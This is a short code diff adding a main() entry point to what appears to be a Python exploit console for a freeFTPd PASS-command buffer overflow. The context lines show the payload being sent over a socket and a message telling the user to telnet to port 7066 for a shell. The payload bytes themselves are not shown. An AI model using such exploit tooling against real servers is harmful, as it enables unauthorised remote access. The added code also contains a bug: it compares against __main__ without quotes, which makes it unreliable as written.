@@ -88,3 +88,8 @@ class freeftpdPassOverflowMenu(cmd.Cmd):
     s.send("PASS " + payload)
     s.close()
     print "[+]Payload sent. Telnet to port 7066 on %s to get your shell. :)" % self.host[0]
+def main():
+  freeftpdpassoverflowmenu = freeftpdPassOverflowMenu()
+  freeftpdpassoverflowmenu.cmdloop("pdf-console attack(freeftpd_pass_overflow)% ")
+if __name__ == __main__:
+  main()
